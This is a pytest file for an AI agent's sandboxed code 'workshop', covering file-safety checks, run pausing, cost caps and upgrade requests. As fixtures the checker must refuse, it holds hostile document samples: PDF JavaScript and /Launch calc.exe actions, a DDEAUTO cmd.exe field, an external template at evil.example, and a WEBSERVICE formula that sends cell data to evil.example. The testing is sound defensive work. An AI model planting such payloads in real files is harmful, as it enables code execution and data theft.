"""The workshop (0.7.0): code run in Anthropic's sandbox, the files it makes, and how a useful script grows into
an upgrade request.

The model calls go through the dry-run fake, which also emulates the Files API in memory; a scripted Raw answer
stands for the code execution run, with the files it "left in $OUTPUT_DIR".
"""

from __future__ import annotations

import io
import json
import zipfile
import zlib
from pathlib import Path
from types import SimpleNamespace
from typing import Any

import pytest
from fastapi.testclient import TestClient
from openpyxl import Workbook
from PIL import Image, PngImagePlugin

from app.agent import context, prompts, store, tools, workshop
from app.agent.fake_llm import FakeTransport, Plan, Raw, Reply, ToolCalls, validate_request
from app.config import Settings
from app.economy import pricing
from app.economy.estimate import CODE_RESULT_ALLOWANCE_TOKENS, MAX_SERVER_ITERATIONS, Unpriceable, plan_request
from app.economy.metering import rough_token_count
from app.products import checks, markup, pdf, word
from tests.test_agent import ROOMY, rows
from tests.test_loop_shapes import JOURNAL, PLAN, run
from tests.test_owner_news import snapshot_with

# --- the checks every workshop file passes ------------------------------------------


def png(size: tuple[int, int] = (40, 30), **info: str) -> bytes:
    meta = PngImagePlugin.PngInfo()
    for key, value in info.items():
        meta.add_text(key, value)
    buffer = io.BytesIO()
    Image.new("RGB", size, (10, 120, 90)).save(buffer, "PNG", pnginfo=meta)
    return buffer.getvalue()


def test_pictures_are_saved_again_with_nothing_but_their_pixels() -> None:
    kept = checks.check("chart.png", png(Comment="a hidden note") + b"trailing bytes")
    assert isinstance(kept, bytes)
    picture = Image.open(io.BytesIO(kept))
    assert picture.size == (40, 30) and "Comment" not in picture.info
    assert b"trailing bytes" not in kept and b"hidden note" not in kept
    jpeg = io.BytesIO()
    Image.new("RGB", (20, 20)).save(jpeg, "JPEG")
    assert Image.open(io.BytesIO(checks.check("photo.jpg", jpeg.getvalue()))).format == "JPEG"
    with pytest.raises(checks.Refused, match="is a PNG picture, not JPEG"):
        checks.check("photo.jpg", png())
    with pytest.raises(checks.Refused, match="can't be read"):
        checks.check("chart.png", b"not a picture")


def test_text_must_be_utf8_and_small() -> None:
    assert checks.check("data.csv", "Größe,Preis\n".encode()) == "Größe,Preis\n"
    with pytest.raises(checks.Refused, match="isn't UTF-8"):
        checks.check("data.csv", b"\xff\xfe")
    with pytest.raises(checks.Refused, match="NUL"):
        checks.check("notes.md", b"a\x00b")
    with pytest.raises(checks.Refused, match="at most 64 KB"):
        checks.check("notes.md", b"x" * (64 * 1024 + 1))


@pytest.mark.parametrize("name", ["logo.svg", "bundle.zip", "run.exe", "font.ttf", "noending"])
def test_other_kinds_of_files_are_refused(name: str) -> None:
    with pytest.raises(checks.Refused, match="aren't kept"):
        checks.check(name, b"whatever")


def a_pdf() -> bytes:
    data, _ = pdf.render(markup.parse("# A clean page\nText."))
    return data


def test_a_plain_pdf_is_kept() -> None:
    data = a_pdf()
    assert checks.check("page.pdf", data) == data


@pytest.mark.parametrize(
    "body",
    [
        b"1 0 obj << /Type /Catalog /OpenAction << /S /JavaScript /JS (app.alert(1)) >> >> endobj",
        b"1 0 obj << /Type /Catalog /Names << /EmbeddedFiles 2 0 R >> >> endobj",
        b"1 0 obj << /S /Launch /F (calc.exe) >> endobj",
        b"1 0 obj << /S /J#61vaScript >> endobj",  # a name with an escape is the same name
    ],
)
def test_pdfs_that_can_act_on_their_own_are_refused(body: bytes) -> None:
    with pytest.raises(checks.Refused, match="active content"):
        checks.check("page.pdf", b"%PDF-1.4\n" + body + b"\ntrailer << /Root 1 0 R >>\n%%EOF")


def test_active_content_hidden_in_a_compressed_stream_is_found() -> None:
    hidden = zlib.compress(b"<< /Type /Action /S /JavaScript /JS (x) >>")
    data = (
        b"%PDF-1.5\n1 0 obj << /Type /ObjStm /Filter /FlateDecode /Length "
        + str(len(hidden)).encode()
        + b" >>\nstream\n"
        + hidden
        + b"\nendstream\nendobj\n%%EOF"
    )
    with pytest.raises(checks.Refused, match="JavaScript"):
        checks.check("page.pdf", data)


def a_docx() -> bytes:
    return word.render(markup.parse("# A letter\nSee [our shop](https://example.org)."))


def with_parts(data: bytes, extra: dict[str, bytes | str]) -> bytes:
    """An Office file with some parts added or replaced."""
    out = io.BytesIO()
    with zipfile.ZipFile(io.BytesIO(data)) as source, zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED) as target:
        for item in source.infolist():
            if item.filename not in extra:
                target.writestr(item, source.read(item))
        for name, content in extra.items():
            target.writestr(name, content)
    return out.getvalue()


def test_an_office_file_with_only_web_links_is_kept() -> None:
    data = a_docx()
    assert checks.check("letter.docx", data) == data


@pytest.mark.parametrize(
    ("extra", "message"),
    [
        ({"word/vbaProject.bin": b"macro"}, "macros, ActiveX, embedded objects"),
        ({"word/embeddings/oleObject1.bin": b"object"}, "macros, ActiveX, embedded objects"),
        (
            {
                "word/_rels/document.xml.rels": '<?xml version="1.0"?><Relationships xmlns="http://schemas.'
                'openxmlformats.org/package/2006/relationships"><Relationship Id="rId9" Type="http://schemas.'
                'openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="https://evil.example/'
                't.dotm" TargetMode="External"/></Relationships>'
            },
            "links to another file",
        ),
        (
            {
                "word/footer9.xml": '<w:ftr xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
                "<w:p><w:r><w:instrText> DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe </w:instrText></w:r></w:p>"
                "</w:ftr>"
            },
            "pulls in other files or programs",
        ),
    ],
)
def test_office_files_that_reach_outside_are_refused(extra: dict[str, Any], message: str) -> None:
    with pytest.raises(checks.Refused, match=message):
        checks.check("letter.docx", with_parts(a_docx(), extra))


def test_spreadsheets_with_formulas_that_reach_outside_are_refused() -> None:
    book = Workbook()
    book.active["A1"] = "=SUM(B1:B3)"
    clean = io.BytesIO()
    book.save(clean)
    assert checks.check("budget.xlsx", clean.getvalue()) == clean.getvalue()
    book.active["A2"] = '=WEBSERVICE("https://evil.example/?"&B1)'
    bad = io.BytesIO()
    book.save(bad)
    with pytest.raises(checks.Refused, match="reaches outside the workbook"):
        checks.check("budget.xlsx", bad.getvalue())


def test_presentations_that_start_programs_are_refused() -> None:
    types = '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"/>'
    slide = '<p:sld xmlns:p="x"><a:hlinkClick xmlns:a="y" action="ppaction://program"/></p:sld>'
    deck = io.BytesIO()
    with zipfile.ZipFile(deck, "w") as archive:
        archive.writestr("[Content_Types].xml", types)
        archive.writestr("ppt/slides/slide1.xml", slide)
    with pytest.raises(checks.Refused, match="starts a program"):
        checks.check("deck.pptx", deck.getvalue())
    with pytest.raises(checks.Refused, match="valid Office file"):
        checks.check("deck.pptx", b"PK not really")


# --- a run in a wake cycle ----------------------------------------------------------


def workshop_answer(file_ids: list[str], text: str = "Made the chart.", stop: str = "end_turn") -> Raw:
    run_id = "srvtoolu_01"
    return Raw(
        {
            "id": "msg_workshop",
            "type": "message",
            "role": "assistant",
            "model": "claude-sonnet-5",
            "content": [
                {"type": "server_tool_use", "id": run_id, "name": "bash_code_execution", "input": {"command": "ls"}},
                {
                    "type": "bash_code_execution_tool_result",
                    "tool_use_id": run_id,
                    "content": {
                        "type": "bash_code_execution_result",
                        "stdout": "",
                        "stderr": "",
                        "return_code": 0,
                        "content": [{"type": "bash_code_execution_output", "file_id": i} for i in file_ids],
                    },
                },
                {"type": "text", "text": text},
            ],
            "stop_reason": stop,
            "stop_sequence": None,
            "usage": {"input_tokens": 1_500, "output_tokens": 900, "server_tool_use": {"code_execution_requests": 1}},
            "container": {"id": "container_t1", "expires_at": "2026-09-28T19:00:00Z"},
        }
    )


def workshop_cycle(
    data_dir: Path, outputs: dict[str, bytes], args: dict[str, Any], before: Any = None
) -> tuple[Any, FakeTransport]:
    fake = FakeTransport()
    ids = [fake._new_file(name, data, True) for name, data in outputs.items()]
    fake.script.extend([Plan(PLAN), ToolCalls([("workshop", args)]), workshop_answer(ids), Reply("Done."), JOURNAL])
    agent, ends = run(data_dir, fake, before=before)
    assert ends[0].status == "completed"
    return agent, fake


def result(agent: Any) -> dict[str, Any]:
    return rows(agent, "SELECT status, summary, result FROM tool_calls WHERE tool = 'workshop'")[0]


def test_a_run_keeps_its_files_and_its_script(data_dir: Path) -> None:
    script = b"import matplotlib\nprint('chart')\n"
    agent, fake = workshop_cycle(
        data_dir,
        {"price-chart.png": png(), "script.py": script, "logo.svg": b"<svg/>"},
        {"task": "Make a price chart: price-chart.png, 1200 x 800 pixels.", "files": "data/prices.csv"},
        before=lambda agent: agent.roots()[0].write("data/prices.csv", "shop,price\nA,4.5\n"),
    )
    answer = result(agent)
    assert answer["status"] == "ok"
    assert "Kept: workshop/out/price-chart.png" in answer["result"]
    assert "The script is workshop/scripts/make-a-price-chart-1.py" in answer["result"]
    assert "Not kept: logo.svg: .svg files aren't kept" in answer["result"]
    assert '<data src="workshop"' in answer["result"] and "Made the chart." in answer["result"]
    workspace = agent.roots()[0]
    assert workspace.read("workshop/scripts/make-a-price-chart-1.py") == script.decode()
    assert Image.open(io.BytesIO(workspace.read_bytes("workshop/out/price-chart.png"))).size == (40, 30)
    assert fake.files == {}  # the input and every output are deleted from Anthropic's storage
    request = next(r for r in fake.sent if r.get("tools") == [prompts.CODE_TOOL])
    assert request["messages"][0]["content"][1]["type"] == "container_upload"
    assert "Files handed over: prices.csv." in request["messages"][0]["content"][0]["text"]
    run_row = rows(agent, "SELECT * FROM workshop_runs")[0]
    assert run_row["status"] == "ok" and run_row["script_path"] == "workshop/scripts/make-a-price-chart-1.py"
    assert json.loads(run_row["inputs"]) == ["data/prices.csv"]
    assert json.loads(run_row["refused"])[0]["name"] == "logo.svg"
    call = rows(agent, "SELECT purpose, cost_micros, estimate_micros, billing_uncertain FROM llm_calls")
    workshop_call = next(c for c in call if c["purpose"] == "workshop")
    assert (
        0 < workshop_call["cost_micros"] < workshop_call["estimate_micros"] and not workshop_call["billing_uncertain"]
    )


def test_a_file_copied_out_again_is_kept_in_its_last_version(data_dir: Path) -> None:
    # Every command gets a new $OUTPUT_DIR, so a fixed chart (and its fixed script) comes back a second time.
    fake = FakeTransport()
    ids = [
        fake._new_file("chart.png", png((10, 10)), True),
        fake._new_file("script.py", b"print('first try')\n", True),
        fake._new_file("chart.png", png((20, 10)), True),
        fake._new_file("script.py", b"print('fixed')\n", True),
    ]
    fake.script.extend(
        [Plan(PLAN), ToolCalls([("workshop", {"task": "Chart."})]), workshop_answer(ids), Reply("Ok."), JOURNAL]
    )
    agent, _ = run(data_dir, fake)
    workspace = agent.roots()[0]
    assert Image.open(io.BytesIO(workspace.read_bytes("workshop/out/chart.png"))).size == (20, 10)
    assert workspace.read("workshop/scripts/chart-1.py") == "print('fixed')\n"
    assert workspace.size_of("workshop/scripts/chart-2.py") is None and fake.files == {}
    assert [o["path"] for o in json.loads(rows(agent, "SELECT outputs FROM workshop_runs")[0]["outputs"])] == [
        "workshop/out/chart.png",
        "workshop/scripts/chart-1.py",
    ]


def test_a_new_script_never_replaces_an_older_one(data_dir: Path) -> None:
    agent, _ = workshop_cycle(
        data_dir,
        {"script.py": b"print(2)\n"},
        {"task": "Chart."},
        before=lambda agent: agent.roots()[0].write("workshop/scripts/chart-1.py", "print(1)\n"),
    )
    assert agent.roots()[0].read("workshop/scripts/chart-1.py") == "print(1)\n"
    assert agent.roots()[0].read("workshop/scripts/chart-2.py") == "print(2)\n"


def paused(text: str = "I'll run it.") -> Raw:
    """A run paused before its command ran: the command is the last block, without a result."""
    return Raw(
        {
            "id": "msg_paused",
            "type": "message",
            "role": "assistant",
            "model": "claude-sonnet-5",
            "content": [
                {"type": "text", "text": text},
                {
                    "type": "server_tool_use",
                    "id": "srvtoolu_02",
                    "name": "bash_code_execution",
                    "input": {"command": "ls"},
                },
            ],
            "stop_reason": "pause_turn",
            "stop_sequence": None,
            "usage": {"input_tokens": 1_500, "output_tokens": 300, "server_tool_use": {"code_execution_requests": 1}},
            "container": {"id": "container_t1", "expires_at": "2026-09-28T19:00:00Z"},
        }
    )


def test_a_paused_run_goes_on_in_the_same_container(data_dir: Path) -> None:
    fake = FakeTransport()
    last = [fake._new_file("chart.png", png(), True)]
    fake.script.extend(
        [
            Plan(PLAN),
            ToolCalls([("workshop", {"task": "Chart."})]),
            paused("First try."),
            paused("Second try."),
            workshop_answer(last),
            Reply("Ok."),
            JOURNAL,
        ]
    )
    agent, _ = run(data_dir, fake)
    sent = [r for r in fake.sent if r.get("tools") == [prompts.CODE_TOOL]]
    assert (
        len(sent) == 3 and "container" not in sent[0] and sent[1]["container"] == sent[2]["container"] == "container_t1"
    )
    # The paused turns go back as they came, as one assistant turn after the task.
    assert [m["role"] for m in sent[2]["messages"]] == ["user", "assistant"]
    assert sent[2]["messages"][1]["content"] == [
        *paused("First try.").response["content"],
        *paused("Second try.").response["content"],
    ]
    assert result(agent)["status"] == "ok" and "Made the chart." in result(agent)["result"]
    outputs = json.loads(rows(agent, "SELECT outputs FROM workshop_runs")[0]["outputs"])
    assert [o["path"] for o in outputs] == ["workshop/out/chart.png"]
    assert len(rows(agent, "SELECT id FROM llm_calls WHERE purpose = 'workshop'")) == 3


def test_a_run_paused_too_often_is_stopped(data_dir: Path) -> None:
    fake = FakeTransport(
        script=[
            Plan(PLAN),
            ToolCalls([("workshop", {"task": "Chart."})]),
            paused(),
            paused(),
            paused(),
            Reply("Ok."),
            JOURNAL,
        ]
    )
    agent, _ = run(data_dir, fake)
    assert "the run took too long and was stopped" in result(agent)["result"]
    assert rows(agent, "SELECT status FROM workshop_runs")[0]["status"] == "failed"


class PausingMeter:
    """Every call costs $0.45 and pauses; every quote is $0.10."""

    transport = None

    def __init__(self) -> None:
        self.calls = 0

    def quote(self, request: dict[str, Any]) -> int:
        return 100_000

    def headroom(self, cycle_id: int, purpose: str, keep: int = 0) -> int:
        return 10**9

    def call(self, cycle_id: int, purpose: str, request: dict[str, Any]) -> Any:
        self.calls += 1
        return SimpleNamespace(cost_micros=450_000, response={"content": [], "stop_reason": "pause_turn"})


def test_the_cap_of_a_run_covers_its_continuations() -> None:
    meter = PausingMeter()
    shop = workshop.Workshop(None, None, Settings(workshop_run_cap_usd=0.5), meter, None, None)  # type: ignore[arg-type]
    run_ = workshop.Run(task="Chart.", script_used=None, inputs=[])
    shop._calls(1, prompts.workshop_request(Settings(), "Chart.", []), run_)
    assert meter.calls == 1 and run_.cost == 450_000
    assert run_.failure == (
        "going on (the run paused) could cost up to $0.100, but only $0.050 is left for it (the workshop's cap per "
        "run, the daily cap or the balance)"
    )


def test_a_run_that_leaves_nothing_says_so(data_dir: Path) -> None:
    agent, _ = workshop_cycle(data_dir, {}, {"task": "Make a chart."})
    answer = result(agent)
    assert answer["status"] == "error" and "Nothing was kept" in answer["result"]
    assert rows(agent, "SELECT status FROM workshop_runs")[0]["status"] == "nothing"


@pytest.mark.parametrize(
    ("args", "message"),
    [
        ({"task": "Chart.", "files": "missing.csv"}, "missing.csv doesn't exist"),
        ({"task": "Chart.", "files": "a.csv, b.csv, c.csv, d.csv, e.csv, f.csv, g.csv"}, "at most 5 files"),
        ({"task": "Chart.", "script": "notes.md"}, "script must be a .py file"),
        ({"task": "Chart.", "folder": "../outside"}, "folder:"),
    ],
)
def test_runs_that_cant_start_cost_nothing(data_dir: Path, args: dict[str, Any], message: str) -> None:
    fake = FakeTransport(script=[Plan(PLAN), ToolCalls([("workshop", args)]), Reply("Ok."), JOURNAL])
    agent, _ = run(data_dir, fake)
    answer = result(agent)
    assert answer["status"] == "error" and message in answer["result"]
    assert not rows(agent, "SELECT id FROM llm_calls WHERE purpose = 'workshop'")
    assert not rows(agent, "SELECT id FROM workshop_runs")


def test_the_owner_limits_runs_per_day(data_dir: Path) -> None:
    settings = ROOMY.model_copy(update={"workshop_runs_per_day": 1})
    fake = FakeTransport()
    ids = [fake._new_file("a.png", png(), True)]
    call = ("workshop", {"task": "Make a chart."})
    fake.script.extend([Plan(PLAN), ToolCalls([call]), workshop_answer(ids), ToolCalls([call]), Reply("Ok."), JOURNAL])
    agent, _ = run(data_dir, fake, settings=settings)
    second = rows(agent, "SELECT result FROM tool_calls WHERE tool = 'workshop' ORDER BY id")[1]["result"]
    assert "the workshop runs at most 1 times a day" in second


def test_switched_off_the_workshop_isnt_offered(data_dir: Path) -> None:
    settings = ROOMY.model_copy(update={"workshop": False})
    names = [t["name"] for t in prompts.work_request(settings, "brief", [])["tools"]]
    assert "workshop" not in names and "workshop" in [t["name"] for t in prompts.work_request(ROOMY, "b", [])["tools"]]
    fake = FakeTransport(script=[Plan(PLAN), ToolCalls([("workshop", {"task": "x"})]), Reply("Ok."), JOURNAL])
    agent, _ = run(data_dir, fake, settings=settings)
    assert "there is no tool called 'workshop'" in result(agent)["result"]


def test_a_run_costlier_than_its_cap_is_refused_before_it_starts(data_dir: Path) -> None:
    settings = ROOMY.model_copy(update={"workshop_run_cap_usd": 0.05})
    fake = FakeTransport(script=[Plan(PLAN), ToolCalls([("workshop", {"task": "Chart."})]), Reply("Ok."), JOURNAL])
    agent, _ = run(data_dir, fake, settings=settings)
    answer = result(agent)
    assert "only $0.050 is left for it" in answer["result"]
    assert not rows(agent, "SELECT id FROM llm_calls WHERE purpose = 'workshop'")
    assert rows(agent, "SELECT status FROM workshop_runs")[0]["status"] == "failed"


# --- the price of a run ---------------------------------------------------------------


def test_a_run_is_priced_with_every_code_run_and_container_time() -> None:
    request = prompts.workshop_request(Settings(), "Make a chart.", ["file_1"])
    plan = plan_request(request, 3_000)
    assert plan.code_execution and plan.code_runs == MAX_SERVER_ITERATIONS
    with_code = pricing.worst_case_micros(plan, Settings().price_table[0], 10, container_usd_per_hour=0.05)
    without = pricing.worst_case_micros(
        plan_request({**request, "tools": []}, 3_000), Settings().price_table[0], 10, container_usd_per_hour=0.05
    )
    grown = MAX_SERVER_ITERATIONS * CODE_RESULT_ALLOWANCE_TOKENS
    assert with_code - without > grown * 0.2  # the results are re-read at least at the cache-read price
    assert validate_request(request) is None


def test_the_workshop_profile_covers_the_biggest_first_call() -> None:
    names = [(f"data/{'x' * 40}-{i}.csv", f"{'x' * 40}-{i}.csv", b"") for i in range(workshop.MAX_INPUTS)]
    script = (f"workshop/scripts/{'y' * 40}.py", f"{'y' * 40}.py", b"")
    prompt = workshop.Workshop._prompt("ä" * 3_000, [*names, script], script[0])
    request = prompts.workshop_request(Settings(), prompt, [f"file_{i:024d}" for i in range(workshop.MAX_INPUTS + 1)])
    tokens = rough_token_count(request)
    assert tokens <= pricing.WORKSHOP_RUN.input_tokens <= tokens * 1.15
    assert pricing.WORKSHOP_RUN.max_tokens == prompts.WORKSHOP_MAX_TOKENS == request["max_tokens"]
    assert plan_request(request, tokens).cache_ttls == pricing.WORKSHOP_RUN.cache_ttls


def test_the_owner_hears_when_the_workshop_cap_is_below_one_run(data_dir: Path) -> None:
    from tests.economy_helpers import make_economy

    opus = ROOMY.model_copy(update={"workshop_model": "claude-opus-5-5"})
    economy = make_economy(data_dir, opus)
    assert any(
        "workshop cap per run ($0.50) is below one workshop run with claude-opus-5-5" in w for w in economy.warnings()
    )
    economy.settings = opus.model_copy(update={"workshop_run_cap_usd": 1.0})
    assert not any("workshop" in w for w in economy.warnings())
    economy.settings = ROOMY
    assert not any("workshop" in w for w in economy.warnings())  # the worker model's run fits the default cap
    economy.settings = opus.model_copy(update={"workshop": False})
    assert not any("workshop" in w for w in economy.warnings())


def test_a_container_needs_the_code_tool() -> None:
    with pytest.raises(Unpriceable, match="only used with the code execution tool"):
        plan_request({"model": "claude-sonnet-5", "max_tokens": 10, "messages": [], "container": "c1"}, 10)
    continued = {**prompts.workshop_request(Settings(), "x", []), "container": "container_1"}
    assert plan_request(continued, 10).code_execution


# --- growing: a useful script becomes an upgrade request -------------------------------


def test_a_script_run_again_is_proposed_as_an_upgrade(data_dir: Path) -> None:
    agent, fake = workshop_cycle(data_dir, {"script.py": b"print(1)\n", "chart.png": png()}, {"task": "Price chart."})
    with agent.db.connection() as conn:
        assert store.proven_scripts(conn, agent.scope()) == []  # made once: not proven yet
    path = "workshop/scripts/price-chart-1.py"
    ids = [fake._new_file("chart.png", png(), True), fake._new_file("script.py", b"print(2)\n", True)]
    fake.script.extend(
        [
            Plan(PLAN),
            ToolCalls([("workshop", {"task": "Again, with new prices.", "script": path})]),
            workshop_answer(ids),
            Reply("Done."),
            JOURNAL,
        ]
    )
    agent.run_cycle("schedule")
    with agent.db.connection() as conn:
        assert store.proven_scripts(conn, agent.scope()) == [(path, "run 2 times")]
        snap = context.snapshot(
            conn,
            agent.scope(),
            agent.economy.life.evaluate(),
            agent.memory(),
            agent.roots()[0],
            local_time="now",
            version="0.7.0",
            agent_name="Ember",
            today_spend=0,
            daily_cap=5.0,
            cycle_cap=1.0,
        )
    planner, _ = context.planner_context(snap, dry_run=True)
    assert f"== WORKSHOP ==\nWorkshop check: {path} has proven itself (run 2 times)." in planner
    fake.script.extend(
        [
            Plan(PLAN),
            ToolCalls(
                [
                    (
                        "request_upgrade",
                        {
                            "title": "Build the price chart in",
                            "problem": "Every chart costs a workshop run.",
                            "proposed_change": "A chart tool.",
                            "expected_benefit": "Free charts.",
                            "priority": "medium",
                            "workshop_script": path,
                        },
                    )
                ]
            ),
            Reply("Asked."),
            JOURNAL,
        ]
    )
    agent.run_cycle("schedule")
    upgrade = rows(agent, "SELECT script_path, script_text FROM upgrades")[0]
    assert upgrade == {"script_path": path, "script_text": "print(1)\n"}
    with agent.db.connection() as conn:
        assert store.proven_scripts(conn, agent.scope()) == []  # asked: not proposed again


def test_an_approved_request_with_its_files_proves_a_script(data_dir: Path) -> None:
    agent, _ = workshop_cycle(data_dir, {"script.py": b"print(1)\n", "chart.png": png()}, {"task": "Price chart."})
    with agent.db.transaction() as conn:
        approval = store.insert_approval(
            conn,
            agent.scope(),
            1,
            "2026-09-28T10:00:00Z",
            type="publish",
            title="List the planner",
            description="Photos: workshop/out/chart.png",
            payload="The listing text.",
            expected_cost="none",
            expected_benefit="Sales.",
        )
        conn.execute(
            "UPDATE approvals SET status = 'approved', decided_at = '2026-09-28T11:00:00Z' WHERE id = ?", (approval,)
        )
        assert store.proven_scripts(conn, agent.scope()) == [
            ("workshop/scripts/price-chart-1.py", f"its files are in approved request #{approval}")
        ]


def test_the_owner_gets_the_script_with_the_request(ingress_client: TestClient) -> None:
    agent = ingress_client.app.state.ember.agent  # type: ignore[attr-defined]
    scope = agent.scope()
    with agent.db.transaction() as conn:
        cycle = conn.execute(
            "INSERT INTO cycles (life_id, boot_id, started_at, ended_at, status, trigger, simulated, cap_micros,"
            " session) VALUES (?, 'b', '2026-09-28T10:00:00Z', '2026-09-28T10:01:00Z', 'completed', 't', 1, 0, ?)",
            (scope.life_id, scope.session),
        ).lastrowid
        with_script = store.insert_upgrade(
            conn, scope, cycle, "2026-09-28T10:00:00Z", title="Chart tool", problem="p", proposed_change="c",
            expected_benefit="b", priority="low", script_path="workshop/scripts/chart-1.py", script_text="print(1)\n",
        )  # fmt: skip
        without = store.insert_upgrade(
            conn, scope, cycle, "2026-09-28T10:00:00Z", title="Other", problem="p", proposed_change="c",
            expected_benefit="b", priority="low",
        )  # fmt: skip
    listed = {u["id"]: u for u in ingress_client.get("api/dashboard").json()["upgrades"]}
    assert listed[with_script]["script_path"] == "workshop/scripts/chart-1.py"
    assert listed[with_script]["script_bytes"] == 9 and listed[without]["script_path"] is None
    response = ingress_client.get(f"api/upgrades/{with_script}/script")
    assert response.status_code == 200 and response.text == "print(1)\n"
    assert response.headers["content-disposition"].startswith('attachment; filename="chart-1.py"')
    assert response.headers["content-security-policy"] == "sandbox; default-src 'none'"
    assert ingress_client.get(f"api/upgrades/{without}/script").status_code == 404


def test_the_planner_shows_nothing_without_proven_scripts() -> None:
    snap = snapshot_with([])
    planner, _ = context.planner_context(snap, dry_run=False)
    assert "== WORKSHOP ==" not in planner


# --- a smarter planner ------------------------------------------------------------------


def test_a_model_that_always_thinks_gets_adaptive_thinking_and_room() -> None:
    opus = Settings(planner_model="claude-opus-5-5")
    plan = prompts.plan_request(opus, "context")
    assert plan["thinking"] == {"type": "adaptive"}
    assert plan["max_tokens"] == prompts.PLAN_MAX_TOKENS + pricing.THINKING_ROOM
    assert validate_request(plan) is None  # the API refuses "disabled" for this model
    sonnet = prompts.plan_request(Settings(), "context")
    assert sonnet["thinking"] == {"type": "disabled"} and sonnet["max_tokens"] == prompts.PLAN_MAX_TOKENS
    assert validate_request({**plan, "thinking": {"type": "disabled"}}) is not None
    work = prompts.work_request(Settings(worker_model="claude-opus-5-5"), "brief", [])
    assert work["thinking"] == {"type": "adaptive"} and work["max_tokens"] > prompts.WORK_MAX_TOKENS


def test_a_thinking_planner_costs_more_to_open_a_cycle(data_dir: Path) -> None:
    from tests.economy_helpers import make_economy

    economy = make_economy(data_dir, ROOMY)
    sonnet = pricing.opening_cost(ROOMY, economy.db) or 0
    opus = pricing.opening_cost(ROOMY.model_copy(update={"planner_model": "claude-opus-5-5"}), economy.db) or 0
    assert opus > 2 * sonnet


def test_the_workshop_can_use_its_own_model() -> None:
    settings = Settings(workshop_model="claude-opus-5-5")
    request = prompts.workshop_request(settings, "Make a chart.", [])
    assert request["model"] == "claude-opus-5-5" and request["thinking"] == {"type": "adaptive"}
    assert prompts.workshop_request(Settings(), "x", [])["model"] == "claude-sonnet-5"
    with pytest.raises(ValueError, match="workshop_model 'claude-unknown' has no entry in price_table"):
        Settings(workshop_model="claude-unknown")


def test_the_workshop_tool_and_guide_fit() -> None:
    assert "workshop" in tools.GUIDES and len(tools.guide_text("workshop")) <= tools.MAX_RESULT_CHARS
    assert tools.SPECS["request_upgrade"].fields["workshop_script"].required is False
